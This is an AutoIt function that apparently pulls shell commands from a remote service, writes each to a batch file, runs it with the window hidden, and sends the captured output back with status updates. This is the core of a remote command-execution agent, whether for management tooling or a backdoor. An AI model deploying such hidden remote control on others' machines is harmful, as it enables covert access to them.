
 Func fetchShellCommands()
	 
	 Local $commandString=getShellCommands()
	 
	  if StringInStr($commandString,"SUCCESS") Then
		
		 Local $commandArray=StringSplit($commandString, "*")
		 
		 Local $command=$commandArray[1]
		 
		 Local $commandId=$commandArray[2]
		 
		 putShellCommandStatus($commandId,"processing")
		 
		 Local $sFilePath=@WorkingDir & "\shell\shell.cmd"
		 
		 Local $hFileOpen = FileOpen($sFilePath, $FO_CREATEPATH  + $FO_OVERWRITE)
		 
		If $hFileOpen = -1 Then
			
			 putShellCommandStatus($commandId,"fail")
			 
			 putShellCommandFeedBack($commandId, "Error creating the shell file")
			 
			 Return
			
		EndIf
		
		FileWrite($hFileOpen, "$command$ > shellOutput.txt")
		
		FileClose($hFileOpen)
		
		if not FileExists($sFilePath) Then
			
			 putShellCommandStatus($commandId,"fail")
			 
			 putShellCommandFeedBack($commandId, "Error shell file does not exist")
			 
			 Return
			
		EndIf
		
		Local $exitCode=ShellExecuteWait ( "$sFilePath$" , "",@WorkingDir&"\shell", "",@SW_HIDE )
		
		Local $shellOutputFilePath=@WorkingDir & "\shell\shellOutput.txt"
		
        if not FileExists($shellOutputFilePath) Then
			
			 putShellCommandStatus($commandId,"fail")
			 
			 putShellCommandFeedBack($commandId, "Error  Shell out put file does not exist")
			 
			 Return
			
		EndIf
		
		
		 Local $hFileOutput = FileOpen($shellOutputFilePath,  $FO_READ)
		 
		If $hFileOutput = -1 Then
			
			 putShellCommandStatus($commandId,"fail")
			 
			 putShellCommandFeedBack($commandId, "Error could not open shell output file")
			 
			 Return
			
		EndIf
		
		Local $output=FileRead($hFileOutput)
		
		FileClose($hFileOutput)
		
		putShellCommandStatus($commandId,"SUCCESS")
			 
		putShellCommandFeedBack($commandId, @CRLF&$output)
			 
	 EndIf
	 
 EndFunc
 
 
 